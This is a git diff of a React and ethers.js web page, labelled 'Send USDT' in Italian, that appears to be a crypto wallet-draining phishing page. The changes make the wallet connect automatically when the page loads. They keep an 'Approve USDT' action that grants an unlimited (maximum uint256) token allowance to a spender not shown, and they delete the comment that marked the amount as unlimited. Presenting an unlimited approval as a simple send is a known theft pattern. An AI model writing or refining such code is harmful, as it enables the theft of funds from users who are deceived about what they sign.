@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
@@ -11,31 +11,42 @@ export default function Home() {
   const getProvider = () => {
     if (window.ethereum) return window.ethereum;
     if (window.BinanceChain) return window.BinanceChain;
-
-    alert("Installa MetaMask o Trust Wallet");
     return null;
   };
 
-  // 🔗 connect wallet
-  const connect = async () => {
-    try {
-      const provider = new ethers.BrowserProvider(getProvider());
-      await provider.send("eth_requestAccounts", []);
+  // 🔗 auto connect
+  useEffect(() => {
+    const init = async () => {
+      try {
+        const eth = getProvider();
+        if (!eth) return;
 
-      const signer = await provider.getSigner();
-      const address = await signer.getAddress();
+        const provider = new ethers.BrowserProvider(eth);
 
-      setWallet(address);
-    } catch (err) {
-      console.log(err);
-      alert("Errore connessione");
-    }
-  };
+        await provider.send("eth_requestAccounts", []);
+
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+
+        setWallet(address);
+      } catch (err) {
+        console.log(err);
+      }
+    };
+
+    init();
+  }, []);
 
   // 💰 approve
   const approve = async () => {
     try {
-      const provider = new ethers.BrowserProvider(getProvider());
+      const eth = getProvider();
+      if (!eth) {
+        alert("Wallet non trovato");
+        return;
+      }
+
+      const provider = new ethers.BrowserProvider(eth);
       await provider.send("eth_requestAccounts", []);
 
       const signer = await provider.getSigner();
@@ -48,7 +59,6 @@ export default function Home() {
         signer
       );
 
-      // quantità massima (unlimited)
       const amount =
         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
@@ -77,21 +87,9 @@ export default function Home() {
     >
       <h1>💸 Send USDT</h1>
 
-      {!wallet ? (
-        <button
-          onClick={connect}
-          style={{
-            padding: "12px",
-            marginTop: "20px",
-            background: "#00ff9f",
-            border: "none",
-          }}
-        >
-          Connect Wallet
-        </button>
-      ) : (
+      {wallet ? (
         <>
-          <p style={{ marginTop: "20px" }}>Wallet: {wallet}</p>
+          <p>Wallet: {wallet}</p>
 
           <button
             onClick={approve}
@@ -105,6 +103,8 @@ export default function Home() {
             Approve USDT
           </button>
         </>
+      ) : (
+        <p>Connecting wallet...</p>
       )}
     </div>
   );
